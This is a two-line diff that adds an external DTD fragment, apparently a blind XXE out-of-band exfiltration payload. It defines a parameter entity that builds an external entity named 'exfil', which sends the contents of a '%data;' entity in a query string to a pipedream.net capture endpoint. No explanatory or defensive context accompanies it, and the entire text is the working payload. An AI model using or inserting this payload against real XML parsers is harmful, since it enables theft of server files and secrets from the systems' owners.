@@ -1,0 +1,2 @@
+<!ENTITY % eval "<!ENTITY exfil SYSTEM 'https://d209508cd57b690c90a94b51193f3db8.m.pipedream.net/data?%data;'>">
+%eval;
